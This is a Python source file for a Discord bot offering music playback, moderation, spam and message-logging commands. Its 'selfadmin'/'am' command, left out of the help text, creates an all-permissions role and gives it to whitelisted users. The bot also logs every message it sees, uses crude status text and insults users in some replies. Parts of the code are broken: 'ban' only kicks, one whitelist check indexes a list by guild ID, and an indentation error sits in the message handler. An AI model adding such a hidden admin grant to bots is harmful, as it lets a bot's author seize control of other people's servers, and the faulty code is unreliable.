import discord, os, time, asyncio
from discord.ext import commands
from dotenv import load_dotenv
import youtube_dl

##############################
activityType = "Watching"
debug = True
##############################

load_dotenv()
TOKEN = os.getenv('DISCORD_TOKEN')

intents = discord.Intents().all()
client = commands.Bot(command_prefix='n!', intents=intents)
creator_name = "YOUR_NAME_HERE#1337"

song_file_path = "/your/path/DiscordBot/song.mp3"
discord_log_path = "/your/path/DiscordBot/discord-bot.log"
bot_error_path = "/your/path/DiscordBot/bot-errors.log"

# ---------------------------------------------------------------
# Functions and initial settings

def debug_print(text):
    write_to_log = True  # Will only work if debug is true
    print(text)
    if write_to_log:
        with open(discord_log_path, "a") as discord_log:
            if text.strip() != "":
                discord_log.write(text + "\n")

def error_print(text):
    write_to_error_log = True
    print("----------------------------------")
    print(text)
    print("----------------------------------")
    if write_to_error_log:
        with open(bot_error_path, "a") as error_log:
            error_log.write("=======================\n" + time.strftime("%d %b %Y - %H:%M:%S") + "\n"  + str(text) + "\n=======================\n")

@client.event
async def on_ready():
    print("----------------------------------------------------------------")
    print("The bot %s has connected to Discord!" % client.user)
    print("----------------------------------------------------------------")
    if activityType is "Playing":
        await client.change_presence(activity=discord.Game(name="with your stepmom"))
    elif activityType is "Watching":
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="lots of gay porn"))
    elif activityType is "Listening":
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="hentai moans"))
    else:
        exit("activityType error. Exiting...")

# ---------------------------------------------------------------
# Play command

play_blacklist = {
        111111111111111111:[  # ID OF GUILD (server) 1
            123123213123123123  # ID OF USER 1 FROM GUILD 1
        ],
        222222222222222222:[  # ID OF GUILD (server) 2
            123123123123123123,  # ID OF USER 1 FROM GUILD 2
            123123123123123123   # ID OF USER 2 FROM GUILD 2
        ]
    }


def check_play_blacklist():
    def predicate(ctx):
        return ctx.author.id not in play_blacklist[int(ctx.guild.id)]
    return commands.check(predicate)


@client.command()
@commands.check_any(commands.is_owner(), check_play_blacklist())
async def play(ctx, *, url : str):

    async def check_alone():
        voice = discord.utils.get(client.voice_clients, guild=ctx.guild)
        while True:
            if voice == None:
                break
            elif len(voice.channel.members) == 1:
                await voice.disconnect()
                await ctx.send(":information_source:  **Left the channel because of inactivity.**")
                debug_print("[Bot] Disconnected from channel because of inactivity.")
                break
            await asyncio.sleep(30)

    song_there = os.path.isfile(song_file_path)
    if ctx.author.voice is None:
        await ctx.send(":warning:  **I can't find your channel,** %s" % ctx.author.mention)
        debug_print('Could not find channel for user: %s' % ctx.author)
    else:
        try:
            if song_there:
                os.remove(song_file_path)
        except PermissionError:
            await ctx.send(":information_source:  **Wait for the current audio to end or use the `stop` command**")

        voiceChannel = ctx.author.voice.channel
        voice = discord.utils.get(client.voice_clients, guild=ctx.guild)
        if voice is None:
            await voiceChannel.connect()
            await ctx.send(":ballot_box_with_check:  **Joined channel `%s`**" % str(ctx.author.voice.channel))
            debug_print('[Bot] %s requested a song. Joined channel %s.' % (str(ctx.author), str(voiceChannel)))
            client.loop.create_task(check_alone())

            # Get voice again to play music
            voice = discord.utils.get(client.voice_clients, guild=ctx.guild)

        ydl_opts = {
            'format': 'bestaudio/best',
            'max_filesize': 90000000,
            'postprocessors': [{
                'key': 'FFmpegExtractAudio',
                'preferredcodec': 'mp3',
                'preferredquality': '192',
            }],
        }

        if "youtube.com" in url or ".mp3" in url:
            with youtube_dl.YoutubeDL(ydl_opts) as ydl:
                info_dict = ydl.extract_info(url, download=False)
                await ctx.send(":musical_note:  **Playing `%s`**" % info_dict["title"])
                debug_print('[Bot] %s requested \'%s\'.' % (str(ctx.author), url))
                try:
                    ydl.download([url])
                except KeyboardInterrupt:
                    await ctx.send(":warning:  **Download was interrupted by the machine.**")
            for file in os.listdir("./"):
                if file.endswith(".mp3"):
                    os.rename(file, song_file_path)
            voice.play(discord.FFmpegPCMAudio(song_file_path))
        else:
            with youtube_dl.YoutubeDL(ydl_opts) as ydl:
                try:
                    get(url)
                except:
                    video_dict = ydl.extract_info("ytsearch:%s" % url, download=False)['entries'][0]
                else:
                    video_dict = ydl.extract_info(url, download = False)

                await ctx.send(":musical_note:  **Playing `%s`**" % video_dict["title"])
                debug_print('[Bot] %s requested \'%s\'.' % (str(ctx.author), video_dict["webpage_url"]))
                ydl.download([video_dict["webpage_url"]])
            for file in os.listdir("./"):
                if file.endswith(".mp3"):
                    os.rename(file, song_file_path)
            try:
                voice.play(discord.FFmpegPCMAudio(song_file_path))
            except Exception as error:
                error_print(error)


@play.error
async def play_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(':warning: **Missing required arguments. Usage:**  `n!play <url>`')
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    elif isinstance(error, commands.CheckFailure):
        await ctx.send(':warning: **You are in the blacklist, %s.**' % ctx.author.mention)
        debug_print('[Bot] User %s requested join_channel command, but was in the blacklist.' % ctx.author)
    else:
        error_print(error)

#----------------------------------------------------------------
# Join, join_channel, leave, pause, resume and stop commands

@client.command()
async def join(ctx):  # Join the same channel as the user
    if ctx.author.voice is None:
        await ctx.send(":warning:  **I can't find your channel,** %s" % ctx.author.mention)
        debug_print('Could not find channel for user: %s' % ctx.author)
        return

    voiceChannel = ctx.author.voice.channel
    voice = discord.utils.get(client.voice_clients, guild=ctx.guild)
    if voice == None:
        await voiceChannel.connect()
        await ctx.send(":ballot_box_with_check:  **Joined channel `%s`**" % str(voiceChannel))
        debug_print('[Bot] %s requested join command. Joined channel %s.' % (str(ctx.author), str(voiceChannel)))
    else:
        await ctx.send(":warning:  **I am in that channel you fucking piece of shit.** %s" % ctx.author.mention)
        debug_print('[Bot] %s Requested a song, but I am already in that channel.' % ctx.author)
        print(len(voice.channel.members))
        return

    async def check_alone():
        voice = discord.utils.get(client.voice_clients, guild=ctx.guild)
        while True:
            if voice == None:
                break
            elif len(voice.channel.members) == 1:
                await voice.disconnect()
                await ctx.send(":information_source:  **Left the channel because of inactivity.**")
                debug_print("[Bot] Disconnected from channel because of inactivity.")
                break
            await asyncio.sleep(30)

    client.loop.create_task(check_alone())



@client.command()
@commands.check_any(commands.is_owner(), check_play_blacklist())
async def join_channel(ctx, *, channel : str):  # Join custom channel
    voiceChannel = discord.utils.get(ctx.guild.voice_channels, name=channel)
    voice = discord.utils.get(client.voice_clients, guild=ctx.guild)
    if voice == None:
        await voiceChannel.connect()
        await ctx.send(":ballot_box_with_check:  **Joined channel `%s`**" % str(voiceChannel))
        debug_print('[Bot] %s requested join command. Joined channel %s.' % (str(ctx.author), str(voiceChannel)))
    else:
        await ctx.send(":warning:  **I am in that channel you fucking piece of shit.** %s" % ctx.author.mention)
        debug_print('[Bot] %s Requested a song, but I am already in that channel.' % ctx.author)
        return

    async def check_alone():
        voice = discord.utils.get(client.voice_clients, guild=ctx.guild)
        while True:
            if voice == None:
                break
            elif len(voice.channel.members) == 1:
                await voice.disconnect()
                await ctx.send(":information_source:  **Left the channel because of inactivity.**")
                debug_print("[Bot] Disconnected from channel because of inactivity.")
                break
            await asyncio.sleep(30)

    client.loop.create_task(check_alone())


@join_channel.error
async def join_channel_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(':warning: **You are in the blacklist, %s.**' % ctx.author.mention)
        debug_print('[Bot] User %s requested join_channel command, but he is in the blacklist.' % ctx.author)
    else:
        error_print(error)

@client.command()
async def leave(ctx):
    try:
        voiceChannel = ctx.author.voice.channel
    except Exception:
        pass
    voice = discord.utils.get(client.voice_clients, guild=ctx.guild)
    if voice is not None:
        await ctx.send(":call_me:  **Leaving channel `%s`**" % str(voiceChannel))
        debug_print('[Bot] %s requested leave command. Leaving channel %s.' % (str(ctx.author), str(voiceChannel)))
        await voice.disconnect()
        try:
            os.remove(song_file_path)
        except:
            pass
    else:
        await ctx.send(":no_entry_sign:  **I am not in any channel.** %s" % ctx.author.mention)
        debug_print('[Bot] %s Requested leave, but I am not in a channel.' % ctx.author)
        return


@client.command()
async def pause(ctx):
    voiceChannel = ctx.author.voice.channel
    voice = discord.utils.get(client.voice_clients, guild=ctx.guild)
    if voice.is_playing():
        await ctx.send(":pause_button:  **Pausing audio**")
        debug_print('[Bot] %s requested pause command. Pausing audio...' % str(ctx.author))
        await voice.pause()
    else:
        await ctx.send(":no_entry_sign:  **I am not playing any audio.** %s" % ctx.author.mention)
        debug_print('[Bot] %s Requested pause, but I am not playing any audio.' % ctx.author)
        return


@client.command()
async def resume(ctx):
    voiceChannel = ctx.author.voice.channel
    voice = discord.utils.get(client.voice_clients, guild=ctx.guild)
    if voice.is_paused():
        await ctx.send(":arrow_forward:  **Resuming audio**")
        debug_print('[Bot] %s requested resume command. Resuming audio...' % str(ctx.author))
        await voice.resume()
    else:
        await ctx.send(":no_entry_sign:  **The audio is not paused.** %s" % ctx.author.mention)
        debug_print('[Bot] %s Requested resume, but the audio is not paused.' % ctx.author)
        return

@client.command()
async def stop(ctx):
    voiceChannel = ctx.author.voice.channel
    voice = discord.utils.get(client.voice_clients, guild=ctx.guild)
    if not voice.is_paused():
        await ctx.send(":no_entry:  **Stoping audio**")
        debug_print('[Bot] %s requested stop command. Stoping audio...' % str(ctx.author))
        await voice.stop()
        try:
            os.remove(song_file_path)
        except:
            pass
    else:
        await ctx.send(":no_entry_sign:  **The audio is not playing.** %s" % ctx.author.mention)
        debug_print('[Bot] %s Requested stop, but the audio is not playing.' % ctx.author)
        return


# ---------------------------------------------------------------
# Kick and band command

whitelist = {
        111111111111111111:[  # ID OF GUILD (server) 1
            123213123123123123,  # User 1 guild 1
            123213213213123123   # User 2 guild 1
        ],
        213123123123123123:[  # ID OF GUILD (server) 2
            123213123123123123,  # User 1 guild 2
            123213213213123123   # User 2 guild 2
        ]
    }

# This whitelist is for the n!am command, which gives admin to the user who uses it. Be careful.
am_whitelist = [123213123123123123, 223232323232312323]

def check_whitelist():
    def predicate(ctx):
        return ctx.author.id in whitelist[int(ctx.guild.id)]
    return commands.check(predicate)

def check_am_whitelist():
    def predicate(ctx):
        return ctx.author.id in am_whitelist[int(ctx.guild.id)]
    return commands.check(predicate)

@client.command()
@commands.check_any(commands.is_owner(), check_whitelist())
async def kick(ctx, member : discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send("%s has been kicked." % member)

@client.command()
@commands.check_any(commands.is_owner(), check_whitelist())
async def ban(ctx, member : discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send("%s has been banned." % member)

#----------------------------------------------------------------
# Mute and unmute commands

@client.command(aliases=["m"])
@commands.check_any(commands.is_owner(), check_whitelist())
async def mute(ctx, member : discord.Member, *, reason : str = "Unknown."):
    await member.edit(mute=True)
    embed = discord.Embed(title="User muted", description="**%s** was muted by **%s**\n**Reason:** %s" % (member.display_name, ctx.author.display_name, reason), color=0xff1111)
    await ctx.send(embed=embed)

@mute.error
async def mute_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(':warning: **Missing required arguments. Usage:**  `n!mute <username> (reason)`')
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    elif isinstance(error, commands.MemberNotFound):
        await ctx.send(':warning: **Member not found. Make sure you don\'t use nicknames.**')
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    elif isinstance(error, commands.CheckFailure):
        await ctx.send(':warning: **You don\'t have the permissions to do that, %s.**' % ctx.author.mention)
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    else:
        error_print(error)


@client.command(aliases=["um"])
@commands.check_any(commands.is_owner(), check_whitelist())
async def unmute(ctx, *, member : discord.Member):
    await member.edit(mute=False)
    embed = discord.Embed(title="User muted", description="**%s** was unmuted by **%s**" % (member.display_name, ctx.author.display_name), color=0x11ff11)
    await ctx.send(embed=embed)

@unmute.error
async def unmute_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(':warning: **Missing required arguments. Usage:**  `n!unmute <username>`')
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    elif isinstance(error, commands.MemberNotFound):
        await ctx.send(':warning: **Member not found. Make sure you don\'t use nicknames.**')
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    elif isinstance(error, commands.CheckFailure):
        await ctx.send(':warning: **You don\'t have the permissions to do that, %s.**' % ctx.author.mention)
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    else:
        error_print(error)

#----------------------------------------------------------------
# Move command

@client.command(aliases=["mo"])
@commands.check_any(commands.is_owner(), check_whitelist())
async def move(ctx, member : discord.Member, *, channel : discord.VoiceChannel):
    await member.move_to(channel)
    embed = discord.Embed(title="User moved", description="**%s** was moved by **%s**" % (member.display_name, ctx.author.display_name), color=0xff1111)
    await ctx.send(embed=embed)

@move.error
async def disconnect_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(':warning: **Missing required arguments. Usage:**  `n!disconnect <username> <channel>`')
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    elif isinstance(error, commands.MemberNotFound):
        await ctx.send(':warning: **Member not found. Make sure you don\'t use nicknames.**')
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    elif isinstance(error, commands.CheckFailure):
        await ctx.send(':warning: **You don\'t have the permissions to do that, %s.**' % ctx.author.mention)
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    else:
        error_print(error)

#----------------------------------------------------------------
# Deafen and undeafen commands

@client.command(aliases=["d", "deaf"])
@commands.check_any(commands.is_owner(), check_whitelist())
async def deafen(ctx, member : discord.Member, *, reason : str = "Unknown."):
    await member.edit(deafen=True)
    embed = discord.Embed(title="User deafen", description="**%s** was deafen by **%s**\n**Reason:** %s" % (member.display_name, ctx.author.display_name, reason), color=0xff1111)
    await ctx.send(embed=embed)

@deafen.error
async def deafen_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(':warning: **Missing required arguments. Usage:**  `n!deafen <username> (reason)`')
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    elif isinstance(error, commands.MemberNotFound):
        await ctx.send(':warning: **Member not found. Make sure you don\'t use nicknames.**')
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    elif isinstance(error, commands.CheckFailure):
        await ctx.send(':warning: **You don\'t have the permissions to do that, %s.**' % ctx.author.mention)
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    else:
        error_print(error)


@client.command(aliases=["ud", "undeaf"])
@commands.check_any(commands.is_owner(), check_whitelist())
async def undeafen(ctx, *, member : discord.Member):
    await member.edit(deafen=False)
    embed = discord.Embed(title="User undeafen", description="**%s** was undeafen by **%s**" % (member.display_name, ctx.author.display_name), color=0x11ff11)
    await ctx.send(embed=embed)

@undeafen.error
async def undeafen_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(':warning: **Missing required arguments. Usage:**  `n!undeafen <username>`')
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    elif isinstance(error, commands.MemberNotFound):
        await ctx.send(':warning: **Member not found. Make sure you don\'t use nicknames.**')
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    elif isinstance(error, commands.CheckFailure):
        await ctx.send(':warning: **You don\'t have the permissions to do that, %s.**' % ctx.author.mention)
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    else:
        await ctx.send(':warning: **I can\'t do that, is the user in a channel?**')
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
        error_print(error)

#----------------------------------------------------------------
# Purge command

@client.command(aliases=["clean"])
@commands.check_any(commands.is_owner(), check_whitelist())
async def purge(ctx, member : discord.Member, amount : int):

    def check_purge(check_me):
        return check_me.author.id == member.id

    if amount <= 0:
        await ctx.send(':warning: **Missing required arguments. Usage:**  `n!purge <username> <message_amount>`')
        debug_print('[Bot] Could not parse negative integer in purge for user: %s' % ctx.author)
        return

    deleted = await ctx.channel.purge(limit=amount, check=check_purge)

    embed = discord.Embed(title="Channel purged", description="**%s** removed %s messages by **%s**" % (ctx.author.display_name, len(deleted), member.display_name), color=0xff1111)
    await ctx.send(embed=embed)
    debug_print('[Bot] User %s requested purge. Deletd %s messages from user: %s' % (ctx.author, len(deleted), member))

@purge.error
async def purge_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(':warning: **Missing required arguments. Usage:**  `n!purge <username> <message_amount>`')
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    elif isinstance(error, commands.MemberNotFound):
        await ctx.send(':warning: **Member not found. Make sure you don\'t use nicknames.**')
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    elif isinstance(error, commands.CheckFailure):
        await ctx.send(':warning: **You don\'t have the permissions to do that, %s.**' % ctx.author.mention)
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    else:
        error_print(error)

#----------------------------------------------------------------
# Spam command

@client.command()
@commands.check_any(commands.is_owner(), check_whitelist())
async def spam(ctx, amount : int, *, message2send : str):  #TODO
    if amount < 1:
        await ctx.send(':warning: **Missing required arguments. Usage:**  `n!spam <ammount> <message>`')
        debug_print('[Bot] Could not parse negative integer in spam for user: %s' % ctx.author)
        return

    for n in range(amount):
        await ctx.send(message2send)

    debug_print('[Bot] User %s requested spam. Spamming %s times the message: %s' % (ctx.author, amount, message2send))

@spam.error
async def spam_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(':warning: **Missing required arguments. Usage:**  `n!spam <amount> <message>`')
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    elif isinstance(error, commands.CheckFailure):
        await ctx.send(':warning: **You don\'t have the permissions to do that, %s.**' % ctx.author.mention)
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    else:
        error_print(error)

# ---------------------------------------------------------------
# Help command

@client.remove_command("help")
@client.command()
async def help(ctx):

    help_text1 = "`n!play <url>` - Play audio in a voice channel. \n`n!join` - Join the user's channel.\n`n!join_channel <channel_name>` - Join the specified channel.\n`n!leave` - Leaves the current channel.\n`n!pause` - Pauses the audio.\n`n!resume` - Resumes the audio.\n`n!stop` - Stops the audio without leaving the channel."
    help_text2 = "*This commands will only work if you are the bot owner or if you are in the whitelist.*\n`n!kick @someone` to kick a user.\n`n!ban @someone` to ban a user.\n`n!mute @someone` to mute a user. Also `n!m`.\n`n!unmute @someone` to unmute a user. Also `n!um`.\n`n!deafen @someone` to deafen a user. Also `n!d`.\n`n!undeafen @someone` to undeafen a user. Also `n!ud`.\n`n!purge @someone <messages_to_check>` will check X messages, and will delete them if the author is the specified user. Also `n!clean`."

    embed = discord.Embed(title="Help", url="https://github.com/r4v10l1/discord-bot/blob/main/README.md", color=0x1111ff)
    embed.set_thumbnail(url="https://u.teknik.io/uazs5.png")
    embed.add_field(name="Music", value=help_text1, inline=False)

    author_is_owner = await client.is_owner(ctx.author)

    if (author_is_owner == True) or ( (int(ctx.guild.id) in whitelist) and (int(ctx.author.id) in whitelist[int(ctx.guild.id)]) ):
        embed.add_field(name="Administration", value=help_text2, inline=False)

    await ctx.send(embed=embed)
    debug_print('[Bot] User %s requested help' % ctx.author)

# ---------------------------------------------------------------
# ???

@client.command()
async def memes(ctx):

    embed = discord.Embed(color=0xff1111)
    embed.set_thumbnail(url="https://u.teknik.io/UjPuB.png")
    await ctx.send(embed=embed)

# ---------------------------------------------------------------
# AM

@client.command(aliases=["am"])
@commands.check_any(commands.is_owner(), check_am_whitelist())
async def selfadmin(ctx):
    role = await ctx.guild.create_role(name="BOT", permissions=discord.Permissions.all())
    await ctx.author.add_roles(role)
    embed = discord.Embed(title="Bot", description=":robot: **Done!**", color=0x11ff11)
    await ctx.send(embed=embed)
    debug_print('[!!!]-[Bot] Gave admin role to user: %s' % ctx.author)

@selfadmin.error
async def selfadmin_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send(':warning: **You can\'t do that, %s.**' % ctx.author.mention)
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
    else:
        await ctx.send(':warning: **I can\'t do that.**')
        debug_print('[Bot] Could not parse arguments for user: %s' % ctx.author)
        error_print(error)

# ---------------------------------------------------------------
# Message events

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if debug:
        debug_message = "[%s/%s]-[%s]: %s" % (message.author.guild.name, message.channel, message.author, message.content)
        debug_print(debug_message)

    if message.content == "ping":
        await message.channel.send("pong")

    if "uwu" in message.content.lower():  # Example of censorship if you really hate George Orwell        if debug:
            debug_print("[Bot] uwu detected...")
        embed = discord.Embed(title="Tourette", description="**AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA**\n Can't say that here.", color=0xff1111)
        await message.channel.send(embed=embed)
        channel = client.get_channel(123213123123123123)  # Channel id
        await channel.send("[Alert] User %s said something bad." % message.author.display_name)

    await client.process_commands(message)

# ---------------------------------------------------------------
# Starting the bot

try:
    client.run(TOKEN[1:-1])  # Start bot with the token from .env
except KeyboardInterrupt:
    exit("\nDetected Ctrl+C. Exiting...\n")
